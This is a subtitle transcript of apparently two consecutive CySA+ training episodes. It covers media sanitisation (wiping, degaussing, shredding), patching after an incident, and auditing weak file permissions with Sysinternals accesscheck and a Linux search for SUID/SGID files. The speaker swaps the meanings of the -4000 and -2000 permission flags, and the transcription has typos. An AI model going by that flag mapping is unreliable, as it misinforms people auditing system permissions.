practitioner,\n\n463\n00:23:17.810 --> 00:23:19.870\nI'd be pulling those drives\nout of those machines.\n\n464\n00:23:19.870 --> 00:23:22.620\nDoing a DODY, but\nthen putting them back in.\n\n465\n00:23:22.620 --> 00:23:24.720\nSo that I could recommend that for\nthe next two.\n\n466\n00:23:24.720 --> 00:23:27.490\nAnd maybe they were just\nin a waiting state.\n\n467\n00:23:27.490 --> 00:23:31.250\nI don't wanna accuse anybody of something\nthat they weren't trying to do.\n\n468\n00:23:31.250 --> 00:23:33.740\nMaybe it was just in a facility that\nwas waiting for that to happen.\n\n469\n00:23:33.740 --> 00:23:36.670\nBut if I'm able to get to it before then.\n\n470\n00:23:36.670 --> 00:23:39.470\nYou know, maybe build that into\nfunctionality of the printer itself\n\n471\n00:23:39.470 --> 00:23:42.310\nto where the last thing someone\ndoes before they turn it is\n\n472\n00:23:42.310 --> 00:23:44.110\nhit that dod erase function.\n\n473\n00:23:44.110 --> 00:23:44.940\nOkay, done.\n\n474\n00:23:44.940 --> 00:23:47.080\nAll right,\nwe'll be there to pick it up momentarily.\n\n475\n00:23:47.080 --> 00:23:47.890\nThat could be what you do.\n\n476\n00:23:47.890 --> 00:23:49.920\nBut now you've seen that,\nthat's clearing a drive.\n\n477\n00:23:50.960 --> 00:23:55.030\nLet me just cancel this if I\nhit go it would take some time.\n\n478\n00:23:55.030 --> 00:23:57.031\nIt would take a little bit of time for\n\n479\n00:23:57.031 --> 00:24:01.470\nus to be able to do that if we\nwanted to do that higher level wipe.\n\n480\n00:24:01.470 --> 00:24:02.050\nSo I'm gonna knock that out.\n\n481\n00:24:02.050 --> 00:24:03.690\nWe'll bring back up Google Chrome.\n\n482\n00:24:03.690 --> 00:24:05.880\nHere we go, there's our document.\n\n483\n00:24:05.880 --> 00:24:09.910\nSo now we get to move into purging.\n\n484\n00:24:09.910 --> 00:24:14.640\nSo purging is a basically degaussing.\n\n485\n00:24:14.640 --> 00:24:17.030\nIf you remember,\nback when we had CRT monitors,\n\n486\n00:24:17.030 --> 00:24:21.020\nif you go back that far, typically\nthere was a little button on there.\n\n487\n00:24:21.020 --> 00:24:26.430\nAnd sometimes you get like weird\ncoloration or deformation of the screen.\n\n488\n00:24:26.430 --> 00:24:28.500\nUse our little button,\nit was a degaussed, and\n\n489\n00:24:28.500 --> 00:24:33.850\nbasically kind of like reset\nthe magnetic field of the CRT itself.\n\n490\n00:24:33.850 --> 00:24:36.797\nWell, I don't know if you know this,\nmagnets and hard drives,\n\n491\n00:24:36.797 --> 00:24:38.173\nthey don't like each other.\n\n492\n00:24:38.173 --> 00:24:40.335\nThey don't like each other at all, okay.\n\n493\n00:24:40.335 --> 00:24:43.208\nSo if I do have a physical hard drive,\n\n494\n00:24:43.208 --> 00:24:49.300\nI can use a very powerful set of\nmagnetics to wipe the drive, right?\n\n495\n00:24:49.300 --> 00:24:54.660\nBecause that's how the drive is written to\nand read from, is using a magnetic medium.\n\n496\n00:24:54.660 --> 00:25:00.410\nSo if I use these giant magnetic\nfields to basically destroy\n\n497\n00:25:00.410 --> 00:25:05.270\nhow the polarities of these little\nmagnetic areas on these disks.\n\n498\n00:25:05.270 --> 00:25:07.900\nYou can rest assure that data is now gone.\n\n499\n00:25:07.900 --> 00:25:10.687\nSo that's how we talk\nabout purging the data.\n\n500\n00:25:10.687 --> 00:25:13.348\n&gt;&gt; But we're not talking\nabout my refrigerator magnet.\n\n501\n00:25:13.348 --> 00:25:16.060\nThis is a special device that's does this.\n\n502\n00:25:16.060 --> 00:25:18.930\n&gt;&gt; Right.\nYou are going to have to purchase\n\n503\n00:25:18.930 --> 00:25:23.880\na degausser which is probably\nlike those rare earth magnets, or\n\n504\n00:25:23.880 --> 00:25:28.200\na strong elecromagnetic field\nthat's been created, that will,\n\n505\n00:25:28.200 --> 00:25:32.690\nwhen I say they're strong, don't get your\nhand on it because you take this hand and\n\n506\n00:25:32.690 --> 00:25:34.680\nyou wave bye bye to that hand.\n\n507\n00:25:34.680 --> 00:25:35.880\nRight.\nThat's what you can do.\n\n508\n00:25:35.880 --> 00:25:37.650\nDon't get your hand in between them,\n\n509\n00:25:37.650 --> 00:25:40.570\ncuz when they come together,\nthose things willl smash you good.\n\n510\n00:25:40.570 --> 00:25:45.010\nSo very, very dangerous equipment, but\nif you have that equipment at the ready,\n\n511\n00:25:45.010 --> 00:25:49.690\nthat would be a really good way to\ndestroy the data if you needed to.\n\n512\n00:25:49.690 --> 00:25:52.740\nAnd that brings us into destroying.\n\n513\n00:25:52.740 --> 00:25:54.580\nYou think, well, didn't we just\ntalk about destroying the data?\n\n514\n00:25:54.580 --> 00:25:56.601\nYeah, we dont talking\nabout destroying the data.\n\n515\n00:25:56.601 --> 00:26:01.394\nWe didn't talk about destroying\nthe disk itself, the drive itself.\n\n516\n00:26:01.394 --> 00:26:04.033\nAnd this can be done in\na multitude of different ways by,\n\n517\n00:26:04.033 --> 00:26:07.139\nI love how they put this in here,\nI'm gonna read it cuz it's fun.\n\n518\n00:26:07.139 --> 00:26:09.817\n&gt;&gt; [LAUGH]\n&gt;&gt; Disintegration, here we go,\n\n519\n00:26:09.817 --> 00:26:15.779\nbring it in, disintegration,\npulverization, incineration, and melting.\n\n520\n00:26:15.779 --> 00:26:16.420\n&gt;&gt; Nice.\n\n521\n00:26:16.420 --> 00:26:19.620\n&gt;&gt; And let me just go ahead and\ntake an aside for a second.\n\n522\n00:26:19.620 --> 00:26:22.377\nIf you've never done any of these things\nto a hard drive, you have yet to live.\n\n523\n00:26:22.377 --> 00:26:24.740\n&gt;&gt; [LAUGH]\n&gt;&gt; Cuz I have.\n\n524\n00:26:24.740 --> 00:26:27.530\nI've gotten to do this stuff and\nit is so much fun.\n\n525\n00:26:27.530 --> 00:26:29.324\nIf you are stressed out at work,\n\n526\n00:26:29.324 --> 00:26:32.780\nnothing will relieve it more than\ndestroying a hard drive with\n\n527\n00:26:32.780 --> 00:26:36.370\nsome big mechanical device that\njust crushes it or shreds it, or\n\n528\n00:26:36.370 --> 00:26:40.576\ngetting out the bullet torch and [NOISE]\nand just melting it down to nothing.\n\n529\n00:26:40.576 --> 00:26:42.350\n&gt;&gt; [LAUGH]\n&gt;&gt; Very fun stuff.\n\n530\n00:26:42.350 --> 00:26:44.550\nI always picture the end of Terminator.\n\n531\n00:26:44.550 --> 00:26:45.067\n&gt;&gt; Yes.\n\n532\n00:26:45.067 --> 00:26:46.430\n&gt;&gt; You know it's the.\n\n533\n00:26:46.430 --> 00:26:48.250\nJust tear falls cuz it's so sad.\n\n534\n00:26:48.250 --> 00:26:49.750\n&gt;&gt; Yeah.\n&gt;&gt; And he's just a melted pile of goo.\n\n535\n00:26:49.750 --> 00:26:52.333\nThat's what you wanna do with your drives.\n\n536\n00:26:52.333 --> 00:26:54.835\n&gt;&gt; Hm.\n&gt;&gt; If you really, really, really wanna get\n\n537\n00:26:54.835 --> 00:26:58.937\nrid of it If you wanna make sure that\nit never shows its ugly head again.\n\n538\n00:26:58.937 --> 00:27:00.418\n&gt;&gt; Right.\n&gt;&gt; These are the techniques that\n\n539\n00:27:00.418 --> 00:27:01.333\nyou're want and play.\n\n540\n00:27:01.333 --> 00:27:05.513\nAnd then of course shredding, there are\nthese giant shredders that they bring in\n\n541\n00:27:05.513 --> 00:27:08.910\nand you could drop a refrigerator\non this thing and chew it up.\n\n542\n00:27:08.910 --> 00:27:12.042\n&gt;&gt; I've never seen one in person but I've\ndefinitely watched some videos of some\n\n543\n00:27:12.042 --> 00:27:14.234\nhard drive's shredders and\nit is pretty impressive.\n\n544\n00:27:14.234 --> 00:27:16.843\n&gt;&gt; Yeah, we had a small one where I\nused to work at the insurance company,\n\n545\n00:27:16.843 --> 00:27:18.860\n[INAUDIBLE], largest insurance company.\n\n546\n00:27:18.860 --> 00:27:21.590\nCuz we had a lot of old laptops and\nstuff coming in.\n\n547\n00:27:21.590 --> 00:27:24.701\nSo, it was a small one, but\nit could fit a laptop hard drive,\n\n548\n00:27:24.701 --> 00:27:27.582\nsome SATA's go in there and\njust watch it chew it alive.\n\n549\n00:27:27.582 --> 00:27:28.307\n&gt;&gt; [LAUGH]\n&gt;&gt; And\n\n550\n00:27:28.307 --> 00:27:31.410\nit becomes shredded bits of nothing,\nbasically.\n\n551\n00:27:31.410 --> 00:27:36.020\nAnd then, even then,\nhad a company come and\n\n552\n00:27:36.020 --> 00:27:39.280\ntake that, cuz I think there's like\nnoxious metals and stuff like that.\n\n553\n00:27:39.280 --> 00:27:42.550\nSo you want to recycle that\nin the proper ways as well.\n\n554\n00:27:42.550 --> 00:27:44.050\nSo make sure you follow that.\n\n555\n00:27:44.050 --> 00:27:48.581\nDon't forget the optical mass storage\nmedia down here at the bottom.\n\n556\n00:27:48.581 --> 00:27:51.020\nDon't forget your CD-ROMs or\nyour DVD-ROMs.\n\n557\n00:27:51.020 --> 00:27:52.879\nAnything that might hold sensitive data.\n\n558\n00:27:52.879 --> 00:27:55.089\nThose are storage media.\n\n559\n00:27:55.089 --> 00:27:57.840\nThose fall under these guidelines as well.\n\n560\n00:27:57.840 --> 00:27:59.847\nSo we wanna destroy those.\n\n561\n00:27:59.847 --> 00:28:04.190\nMagnetic-optic disks must be\ndestroyed by pulverizing.\n\n562\n00:28:04.190 --> 00:28:05.946\nWell, don't threaten me with a good time.\n\n563\n00:28:05.946 --> 00:28:07.900\n[LAUGH]\n&gt;&gt; More than happy to do that, so\n\n564\n00:28:07.900 --> 00:28:08.760\nit's a lot of fun.\n\n565\n00:28:09.990 --> 00:28:11.160\nSo Mike, I'm looking at our clock.\n\n566\n00:28:11.160 --> 00:28:13.240\nI think we've run out of\na little bit of time here, so\n\n567\n00:28:13.240 --> 00:28:14.900\nwe're gonna have to go to a part two.\n\n568\n00:28:14.900 --> 00:28:15.920\n&gt;&gt; All right, sounds good,\n\n569\n00:28:15.920 --> 00:28:19.970\nmore techniques when it comes to\npost-incident response and recovery.\n\n570\n00:28:19.970 --> 00:28:21.251\nWe appreciate what you've done so far.\n\n571\n00:28:21.251 --> 00:28:22.160\nLooking forward to the next one.\n\n572\n00:28:22.160 --> 00:28:23.970\nHope everybody out there enjoyed this one.\n\n573\n00:28:23.970 -->

00:00:08.449\n[MUSIC]\n\n4\n00:00:08.449 --> 00:00:12.609\n&gt;&gt; You're watching ITProTV.\n&gt;&gt; Hello,\n\n5\n00:00:12.609 --> 00:00:15.860\nwelcome to another exciting\nepisode here at ITProTV.\n\n6\n00:00:15.860 --> 00:00:19.570\nI'm your host Mike Rodrick,\ntoday we're doing our CYSA+.\n\n7\n00:00:19.570 --> 00:00:22.880\nIn this episode we're taking a look at\nrecovery and post incident response,\n\n8\n00:00:22.880 --> 00:00:26.270\nthis is a part two so\nmake sure you check out part one.\n\n9\n00:00:26.270 --> 00:00:29.340\nHere back in the studios again is\nnone other than Mr. Daniel Lowrie.\n\n10\n00:00:29.340 --> 00:00:31.170\nWelcome back Daniel.\n&gt;&gt; Thanks for having me again Mike,\n\n11\n00:00:31.170 --> 00:00:32.200\nglad to be back.\n\n12\n00:00:32.200 --> 00:00:34.830\nIn the studio with all of you good folks.\n\n13\n00:00:34.830 --> 00:00:36.840\nStudio audience,\nwell I guess it's not a studio audience,\n\n14\n00:00:36.840 --> 00:00:37.920\nyour just the audience.\n&gt;&gt; [LAUGH]\n\n15\n00:00:37.920 --> 00:00:39.530\n&gt;&gt; Not that it make you any worse,\n\n16\n00:00:39.530 --> 00:00:41.840\nit's actually a whole lot cooler\nbecause now you can stop, rewind,\n\n17\n00:00:41.840 --> 00:00:45.210\nfast forward do all the neat stuff that\nthe studio audience would just have to\n\n18\n00:00:45.210 --> 00:00:46.552\nthrow tomatoes at me about.\n\n19\n00:00:46.552 --> 00:00:47.080\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH]\n\n20\n00:00:47.080 --> 00:00:48.160\n&gt;&gt; Hey, say that again,\n\n21\n00:00:48.160 --> 00:00:49.090\nI didn't hear it right?\n\n22\n00:00:49.090 --> 00:00:53.100\nHe's right, we're doing that\npart two on the recovery and\n\n23\n00:00:53.100 --> 00:00:56.990\npost incident response stuff, we had a lot\nof great information in that part one.\n\n24\n00:00:56.990 --> 00:00:58.506\nSo, make sure you check that out.\n\n25\n00:00:58.506 --> 00:01:02.160\nBut, moving on with part two, we've got\na lot of information here as well that we\n\n26\n00:01:02.160 --> 00:01:07.095\nneed to look into, things like\nvalidation and then making sure that,\n\n27\n00:01:07.095 --> 00:01:09.270\nwell once all, everything is all said and\n\n28\n00:01:09.270 --> 00:01:12.400\ndone, how do we make sure that\nthat incident never happens again?\n\n29\n00:01:12.400 --> 00:01:13.800\nOr, if it does, we're prepared for it.\n\n30\n00:01:13.800 --> 00:01:16.800\nWe're gonna look at some of\nthose things as well today.\n\n31\n00:01:16.800 --> 00:01:17.740\n&gt;&gt; Very good, all right.\n\n32\n00:01:17.740 --> 00:01:21.290\nSo, where do we start?\n&gt;&gt; Great job or great question.\n\n33\n00:01:21.290 --> 00:01:23.080\nThat would be in that validation.\n\n34\n00:01:23.080 --> 00:01:26.350\nWe've done some recovery\nprocess at this point, right?\n\n35\n00:01:26.350 --> 00:01:32.540\nBut now we need to make sure that what\nwe've done is effective, has taken hold,\n\n36\n00:01:32.540 --> 00:01:36.190\nand we're not going to be exposed in\nthe way we were for our incident if\n\n37\n00:01:36.190 --> 00:01:40.030\nthe incident occur or that we discovered\na way that the incident could occur.\n\n38\n00:01:40.030 --> 00:01:41.240\nWe've made some changes,\n\n39\n00:01:41.240 --> 00:01:45.120\nnow we gotta make sure that those changes\nhave actually been effective, right?\n\n40\n00:01:45.120 --> 00:01:47.340\nSo this is the validation idea.\n&gt;&gt; Okay.\n\n41\n00:01:47.340 --> 00:01:49.180\n&gt;&gt; We do this through a multitude of\n\n42\n00:01:49.180 --> 00:01:52.120\ndifferent ways, you're probably\nalready screaming a couple of them.\n\n43\n00:01:52.120 --> 00:01:53.952\nIf this was The Price is Right,\nyou'd be like.\n\n44\n00:01:53.952 --> 00:01:54.862\n&gt;&gt; [LAUGH]\n\n45\n00:01:54.862 --> 00:01:55.880\n&gt;&gt; Patching.\n\n46\n00:01:55.880 --> 00:01:57.160\nNo.\nYou know, do this, do it.\n\n47\n00:01:57.160 --> 00:01:57.920\nYes.\nYes.\n\n48\n00:01:57.920 --> 00:02:00.014\nAll those answers you're\nprobably thinking of are correct.\n\n49\n00:02:00.014 --> 00:02:03.164\nLet's make sure we go through the ones\nthat they want you to know in an exam,\n\n50\n00:02:03.164 --> 00:02:04.567\nthat we're all on the same page.\n\n51\n00:02:04.567 --> 00:02:06.562\nAnd we will start with patching, right?\n\n52\n00:02:06.562 --> 00:02:09.734\nIf a machine has been compromised\nin some way shape or form,\n\n53\n00:02:09.734 --> 00:02:13.796\nthrough either an application\nvulnerability or software vulnerability,\n\n54\n00:02:13.796 --> 00:02:16.250\noperating system vulnerability.\n\n55\n00:02:16.250 --> 00:02:19.100\nThat we have patched that vulnerability,\nso\n\n56\n00:02:19.100 --> 00:02:23.420\nthat it is no longer an entry\npoint into our system.\n\n57\n00:02:23.420 --> 00:02:29.290\nThat's a very, a smart thing to do once\nyou've figured out that was the problem.\n\n58\n00:02:29.290 --> 00:02:33.710\nWe talked a little bit about this in\nthe previous episode where we said,\n\n59\n00:02:33.710 --> 00:02:40.190\nif it was that, make sure to, use, update\nyour operating system, apply the patch to\n\n60\n00:02:40.190 --> 00:02:44.740\nthe software, that they were using in both\nyour, after if you did a clean install.\n\n61\n00:02:44.740 --> 00:02:47.450\nOf if you had an image,\nyou need to add that to your image.\n\n62\n00:02:47.450 --> 00:02:51.020\nSo it's a part of the image, so\ngoing out forward, everything is done.\n\n63\n00:02:51.020 --> 00:02:54.830\nAnd that kind of gives you the idea\nof how patching should occur,\n\n64\n00:02:54.830 --> 00:02:56.210\nwhen it comes to an incident.\n\n65\n00:02:56.210 --> 00:03:01.280\nIt's kind of this inside-out mentality,\nalmost like ground zero and\n\n66\n00:03:01.280 --> 00:03:03.670\nthe mushroom cloud of patching is.\n&gt;&gt; [LAUGH]\n\n67\n00:03:03.670 --> 00:03:05.400\n&gt;&gt; Moving across the land.\n\n68\n00:03:05.400 --> 00:03:07.670\nYou start with patient zero, right?\n\n69\n00:03:07.670 --> 00:03:08.900\nAnd you patch that guy first.\n\n70\n00:03:08.900 --> 00:03:12.380\nBecause it's a known entity\nby some threat actor\n\n71\n00:03:12.380 --> 00:03:16.770\nout there in the wild that it had that\npossibility of regaining control.\n\n72\n00:03:16.770 --> 00:03:18.460\nSo you wanna start right there.\n\n73\n00:03:18.460 --> 00:03:21.880\nAnd then move out to\ntertiarily affected systems.\n\n74\n00:03:21.880 --> 00:03:24.460\nMaybe there was a bit\nof a bot net going on.\n\n75\n00:03:24.460 --> 00:03:26.230\nYou start with again, patient zero.\n\n76\n00:03:26.230 --> 00:03:27.650\nThe one you knew for a fact.\n\n77\n00:03:27.650 --> 00:03:28.260\nAnd now you work.\n\n78\n00:03:28.260 --> 00:03:32.150\nWell it was connected to these\nspecific devices directly.\n\n79\n00:03:32.150 --> 00:03:34.200\nThey may be affected.\n\n80\n00:03:34.200 --> 00:03:37.229\nLet's go ahead and move to them,\nand then from there,\n\n81\n00:03:38.370 --> 00:03:42.060\nyou see how the bullseye keeps\ngetting farther and farther away.\n\n82\n00:03:42.060 --> 00:03:46.480\nWe start really small and then work our\nway out to the rest of our organization.\n\n83\n00:03:46.480 --> 00:03:49.920\nBecause the ones that have been affected\n\n84\n00:03:49.920 --> 00:03:53.160\nwe know are compromisable because\nthey've been compromised.\n\n85\n00:03:53.160 --> 00:03:57.486\nThen the ones that they were directly\nconnected to are the most likely next\n\n86\n00:03:57.486 --> 00:04:01.629\ncandidates if the attacker doesn't\nreturn to the scene of the crime.\n\n87\n00:04:01.629 --> 00:04:03.900\nBut to near the scene of the crime.\n\n88\n00:04:03.900 --> 00:04:05.810\nMaybe they were aware of some\nother machines and they'll go for\n\n89\n00:04:05.810 --> 00:04:07.740\nthat, trying to throw you off the scent.\n\n90\n00:04:07.740 --> 00:04:09.450\nSo again, working that way out.\n\n91\n00:04:09.450 --> 00:04:13.340\nThat outside or the inside-out\nmentality when it comes to patching.\n\n92\n00:04:14.400 --> 00:04:17.233\nAll right and then of course patching,\nyou know what to do.\n\n93\n00:04:17.233 --> 00:04:19.741\nYou fire up WSUS and say,\nthis is the patch I need.\n\n94\n00:04:19.741 --> 00:04:22.028\nApply to all WSUS groups.\n\n95\n00:04:22.028 --> 00:04:23.939\nAnd install, right?\n\n96\n00:04:23.939 --> 00:04:25.619\nSo that's what you'll do.\n\n97\n00:04:25.619 --> 00:04:28.073\nMoving on let's go to permissions.\n\n98\n00:04:28.073 --> 00:04:33.007\nPermissions we wanna, this is an easy way\nfor people to, if they've had an incident,\n\n99\n00:04:33.007 --> 00:04:37.535\nsomeone has gotten into a system, now\nthey want to escalate their privileges,\n\n100\n00:04:37.535 --> 00:04:40.257\npermissions is a great\nway to make that happen.\n\n101\n00:04:40.257 --> 00:04:43.772\nOr if I've had an insider threat\nwhere they were able to access\n\n102\n00:04:43.772 --> 00:04:46.014\nsomething that they shouldn't have.\n\n103\n00:04:46.014 --> 00:04:47.104\nWhy did that occur?\n\n104\n00:04:47.104 --> 00:04:49.768\nWell it's probably because\nthey had permission to do so.\n\n105\n00:04:49.768 --> 00:04:53.945\nSo I need to be able to check and\nverify the permissions that are in my\n\n106\n00:04:53.945 --> 00:04:58.647\norganization are set as our policy\ndictates, as regulation dictates, or\n\n107\n00:04:58.647 --> 00:05:02.677\nwhatever it is that we're using\nto say here's our privileges,\n\n108\n00:05:02.677 --> 00:05:06.743\nat least Principle of least privilege,\n\n109\n00:05:06.743 --> 00:05:09.275\nthat's a hard thing to say.\n&gt;&gt; Easy for you to say, right?\n\n110\n00:05:09.275 --> 00:05:10.250\n[LAUGH]\n&gt;&gt; Yeah exactly, exactly.\n\n111\n00:05:11.420 --> 00:05:13.390\nYou want to verify that is happening.\n\n112\n00:05:13.390 --> 00:05:14.780\nThere's a few ways you can do that.\n\n113\n00:05:14.780 --> 00:05:16.290\nMike and I were actually having kinda\n\n114\n00:05:16.290 --> 00:05:17.065\nfun with this.\n\n115\n00:05:17.065 --> 00:05:17.580\n&gt;&gt; Mm-hm.\n&gt;&gt; Right?\n\n116\n00:05:17.580 --> 00:05:19.030\nBefore the show started.\n\n117\n00:05:19.030 --> 00:05:21.520\nMike's, you're a Microsoft guy, right?\n&gt;&gt; Yes sir.\n\n118\n00:05:21.520 --> 00:05:23.230\n&gt;&gt; Know microsoft products\n\n119\n00:05:23.230 --> 00:05:25.070\nquite well, right?\n\n120\n00:05:25.070 --> 00:05:26.535\nI said Mike.\n&gt;&gt; Supposedly, yes.\n\n121\n00:05:26.535 --> 00:05:27.210\n[LAUGH]\n&gt;&gt; Yeah, supposedly.\n\n122\n00:05:27.210 --> 00:05:31.410\nMike, do you know of any easy way to\nperuse the entire file system inside of\n\n123\n00:05:31.410 --> 00:05:36.660\na Windows operating system and let me know\nwhether or not there are things like world\n\n124\n00:05:36.660 --> 00:05:42.560\nwritable or allowing all users to\nrewrite axel, whatever the case is.\n\n125\n00:05:42.560 --> 00:05:44.195\nIs there a way for me to do it?\n&gt;&gt; And\n\n126\n00:05:44.195 --> 00:05:46.520\nbuilt into Windows you\nhave a couple tools, but\n\n127\n00:05:46.520 --> 00:05:47.920\nnothing to do what you're saying.\n&gt;&gt; Right.\n\n128\n00:05:47.920 --> 00:05:50.440\n&gt;&gt; You've got your effective access, but\n\n129\n00:05:50.440 --> 00:05:54.200\nthat's one resource at a time and\nyou can look at inherited permissions.\n\n130\n00:05:54.200 --> 00:05:58.480\nPowerShell talking about writing a script\nto return access control lists and\n\n131\n00:05:58.480 --> 00:06:00.220\nmaybe do some filtering on that.\n\n132\n00:06:00.220 --> 00:06:02.450\nBut no really easy way it builds in.\n&gt;&gt; Exactly.\n\n133\n00:06:02.450 --> 00:06:05.250\nWe were having a tough time when we\nwere thinking, man, if you gotta,\n\n134\n00:06:05.250 --> 00:06:08.600\nif you're a Windows admin and\nyou got to look for jacked up permissions.\n\n135\n00:06:08.600 --> 00:06:11.340\nThat seems like it would\nbe a pretty daunting task.\n\n136\n00:06:11.340 --> 00:06:14.515\nThat can't be the only way I\nmean this just can't be it, so\n\n137\n00:06:14.515 --> 00:06:17.095\nwe just did a little Google searching.\n&gt;&gt; Mm-hm.\n\n138\n00:06:17.095 --> 00:06:17.888\n&gt;&gt; And we were able\n\n139\n00:06:17.888 --> 00:06:21.065\nto find in sysinternals,\nis a great a tool that they built in.\n\n140\n00:06:21.065 --> 00:06:23.725\nOld Mark Russinovich.\n&gt;&gt; Mark Russinovich to the rescue.\n\n141\n00:06:23.725 --> 00:06:24.245\n&gt;&gt; He did not\n\n142\n00:06:24.245 --> 00:06:25.725\nleave us in the lurch, did he?\n\n143\n00:06:25.725 --> 00:06:26.395\nNo, he did not.\n\n144\n00:06:26.395 --> 00:06:27.855\nHe said you know what?\n\n145\n00:06:27.855 --> 00:06:29.155\nWe need to make this happen.\n\n146\n00:06:29.155 --> 00:06:31.025\nSo we do have that and\nI'm going to show you that.\n\n147\n00:06:31.025 --> 00:06:33.135\nI do have sysinternals installed\non my Windows machine.\n\n148\n00:06:33.135 --> 00:06:36.255\nLet's take a look at some those commands\nso we can see how that works out.\n\n149\n00:06:36.255 --> 00:06:37.005\nSo let's jump on my computer.\n\n150\n00:06:38.340 --> 00:06:41.670\nAnd we'll open up this file permissions.\n\n151\n00:06:41.670 --> 00:06:47.250\nOur permissioncheck.txt file that I\ncreated here giving us these different\n\n152\n00:06:47.250 --> 00:06:48.250\nabilities here.\n\n153\n00:06:48.250 --> 00:06:50.160\nSo if you have sysinternals\ninstalled the full suite,\n\n154\n00:06:50.160 --> 00:06:53.780\nyou should have this accesscheck.exe.\n\n155\n00:06:53.780 --> 00:06:59.838\nAnd it'll look for things like\naccept eula, uwdqs and then look for\n\n156\n00:06:59.838 --> 00:07:05.268\nspecific users, and\nsee directory starting from the root.\n\n157\n00:07:05.268 --> 00:07:07.338\nYou always want to start from\nthe root because I want to\n\n158\n00:07:07.338 --> 00:07:08.355\nlook at the entire thing.\n\n159\n00:07:08.355 --> 00:07:12.664\nIf I was, did have a more focused area, I\ncould put that directory in there as well,\n\n160\n00:07:12.664 --> 00:07:17.230\nand then we see it again for\nauthenticated users outside of the system.\n\n161\n00:07:17.230 --> 00:07:21.540\nSo this might be,\nif you're on active directory domain,\n\n162\n00:07:21.540 --> 00:07:25.890\nthis would be local computer looking for\nthese different permissions.\n\n163\n00:07:25.890 --> 00:07:26.980\nFinding weak file permissions.\n\n164\n00:07:26.980 --> 00:07:28.480\nSo this was directory permissions.\n\n165\n00:07:28.480 --> 00:07:30.035\nThis was file permissions.\n\n166\n00:07:30.035 --> 00:07:32.533\nI noticed that this one has a d in it.\n\n167\n00:07:32.533 --> 00:07:33.056\nRight here.\n\n168\n00:07:33.056 --> 00:07:35.690\nSo that's probably letting you know\nto look through the directories.\n\n169\n00:07:35.690 --> 00:07:37.380\nWhereas the file permissions does not.\n\n170\n00:07:37.380 --> 00:07:39.495\nSo it probably defaults to files.\n\n171\n00:07:39.495 --> 00:07:41.160\nWhich would be my guess.\n\n172\n00:07:41.160 --> 00:07:43.500\nAgain, we found this\nminutes before the show.\n\n173\n00:07:43.500 --> 00:07:44.060\nBut.\n&gt;&gt; [LAUGH]\n\n174\n00:07:44.060 --> 00:07:45.340\n&gt;&gt; Very interesting and stuff.\n\n175\n00:07:45.340 --> 00:07:47.080\nAnd, it's a good tool to\nhave in your tool kit.\n\n176\n00:07:47.080 --> 00:07:48.680\nYou're not gonna be tested on this.\n\n177\n00:07:48.680 --> 00:07:52.229\nBut you do want to be able to perform\nthese actions inside of your Window's\n\n178\n00:07:52.229 --> 00:07:53.214\noperating system.\n\n179\n00:07:53.214 --> 00:07:54.228\nWe also see cacls there as well.\n\n180\n00:07:54.228 --> 00:07:56.136\nOr cacls.\n&gt;&gt; Calcs.\n\n181\n00:07:56.136 --> 00:07:56.659\n&gt;&gt; I always call it\n\n182\n00:07:56.659 --> 00:07:57.413\ncalcs.\n&gt;&gt; Yeah.\n\n183\n00:07:57.413 --> 00:07:58.242\n&gt;&gt; I can't help myself, right?\n\n184\n00:07:58.242 --> 00:07:59.987\nMy brain sees calcs.\n\n185\n00:07:59.987 --> 00:08:04.140\nAnd then giving you the finestr for Users.\n\n186\n00:08:05.580 --> 00:08:08.456\nAnd then we service permissions,\nI threw that in for good measure.\n\n187\n00:08:08.456 --> 00:08:13.690\nSo definitely Download Sysinternals is\na great suite of software to have in\n\n188\n00:08:13.690 --> 00:08:14.960\nyour Windows operating system.\n\n189\n00:08:14.960 --> 00:08:15.800\nAs as you can see,\n\n190\n00:08:15.800 --> 00:08:18.870\nit'll help you a lot when it comes\nto finding a weak permissions.\n\n191\n00:08:18.870 --> 00:08:22.220\nI'm going to jump over to Kali Linux,\nyou can also do this in Linux systems or\n\n192\n00:08:22.220 --> 00:08:22.890\nUnix systems.\n\n193\n00:08:22.890 --> 00:08:26.940\nWe'll just do the good ol find /,\nstart at the root and say -perms.\n\n194\n00:08:26.940 --> 00:08:30.805\nI think it's perms,\nit is either perm or perms,\n\n195\n00:08:30.805 --> 00:08:33.832\nwe'll find out here in just a second.\n\n196\n00:08:33.832 --> 00:08:40.366\n-4000, we'll look for the set group ID,\nI believe I think it's the SGUID.\n\n197\n00:08:40.366 --> 00:08:45.519\nAnd then there's the SUID as\nwell which will be -2000,\n\n198\n00:08:45.519 --> 00:08:49.240\nwhich is I'm able to elevate privileges.\n\n199\n00:08:49.240 --> 00:08:54.550\nI have a file or an executable\n\n200\n00:08:54.550 --> 00:08:58.730\nthat will run as different user and\nthat's what I'm looking for with this.\n\n201\n00:08:58.730 --> 00:09:02.840\nSo I'm looking for those permissions that\nsay, hey, or I can start looking for\n\n202\n00:09:02.840 --> 00:09:08.810\nworld writable, that's always an important\nthing to find, things of that nature.\n\n203\n00:09:08.810 --> 00:09:12.410\nBut you run this, and\njust say -f for file, and\n\n204\n00:09:12.410 --> 00:09:17.277\nthen I always like to throw the 2\n/dev/null l action on there.\n\n205\n00:09:17.277 --> 00:09:19.987\nSo that I don't get any weird\nerrors that I don't care,\n\n206\n00:09:19.987 --> 00:09:23.770\nI can't do anything about it anyways,\nso get it out of my face.\n\n207\n00:09:23.770 --> 00:09:24.330\nFire it off.\n\n208\n00:09:24.330 --> 00:09:29.330\nI don't have anything on this box because\nwell there's only one user which is\n\n209\n00:09:29.330 --> 00:09:30.790\nroot and there you go.\n\n210\n00:09:30.790 --> 00:09:33.400\nBut that would be a handy thing to know,\nright?\n\n211\n00:09:33.400 --> 00:09:35.740\nSo there's how you look for\npermissions in both of those systems.\n\n212\n00:09:35.740 --> 00:09:40.790\nThe key to takeaway here is look for\njacked up permissions,\n\n213\n00:09:40.790 --> 00:09:42.550\nsomething that's overreaching.\n\n214\n00:09:42.550 --> 00:09:48.170\nFollow that principle of\nleast privileged advice and\n\n215\n00:09:48.170 --> 00:09:52.340\nmake sure that if Mike doesn't need access\nto HR because he's not an HR employee,\n\n216\n00:09:52.340 --> 00:09:53.940\nhe doesn't have access to it.\n\n217\n00:09:53.940 --> 00:09:55.058\nWe do that through permissions.\n\n218\n00:09:55.058 --> 00:09:57.460\n[COUGH], excuse me.\n\n219\n00:09:57.460 --> 00:10:00.820\nAll right, also running, scanning\n&gt;&gt; Yes.\n\n220\n00:10:00.820 --> 00:10:03.790\n&gt;&gt; So Mike, riddle me this, Batman.\n\n221\n00:10:03.790 --> 00:10:07.240\nIf I were to make some changes,\nwe've had a 